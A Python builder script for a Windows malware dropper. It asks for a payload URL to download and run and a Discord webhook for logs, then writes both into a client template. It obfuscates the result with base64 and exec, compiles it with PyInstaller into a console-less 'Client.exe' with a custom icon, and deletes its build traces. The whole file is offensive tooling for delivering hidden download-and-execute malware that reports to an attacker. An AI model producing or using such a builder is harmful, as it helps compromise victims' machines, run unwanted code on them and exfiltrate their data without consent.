import PyInstaller.__main__
import shutil
import base64
import time
import os

update = input("Update libraries? (required for first run) (yes/no): ")
if update == "yes":
    os.system("python -m pip install --upgrade pip")
    os.system("pip install discord-webhook")
    os.system("pip install requests")
    os.system("pip install psutil")

print('')
file_url = input("File URL to download & run: ")
webhook_url = input("Webhook URL to send log: ")

with open("client.py", "r") as client_file:
    client_code = client_file.read()

with open("new_client.py", "w") as new_client_file:
    modified_client_code = client_code.replace("file_url = '.../YourFile.exe'", f"file_url = '{file_url}'")
    if webhook_url:
        modified_client_code = modified_client_code.replace("webhook_url = 'https://discord.com/api/webhooks/...'",
                                                            f"webhook_url = '{webhook_url}'")
    new_client_file.write(modified_client_code)

with open("new_client.py", "r") as file:
    code = file.read()

encoded_text = base64.b64encode(code.encode())
with open("new_client.py", "w") as file:
    file.write(f"import base64; exec(base64.b64decode({encoded_text}))")

PyInstaller.__main__.run([
    'new_client.py',
    '--onefile',
    '--noconsole',
    '--icon=exe.ico',
    '--hidden-import=discord_webhook',
    '--hidden-import=subprocess',
    '--hidden-import=requests',
    '--hidden-import=discord',
    '--hidden-import=tempfile',
    '--hidden-import=psutil',
    '--hidden-import=socket',
    '--hidden-import=shutil',
    '--hidden-import=winreg',
    '--hidden-import=time',
    '--hidden-import=sys',
    '--hidden-import=os',
    '--hidden-import=io'
])

try:
    time.sleep(1)
    os.remove("new_client.py")
    shutil.rmtree("build")
    os.remove("new_client.spec")
    os.rename("dist/new_client.exe", "dist/Client.exe")
    shutil.move("dist/Client.exe", "./Client.exe")
    shutil.rmtree("dist")
except Exception as e:
    print(f"Error: {e}")

os.system("pause")
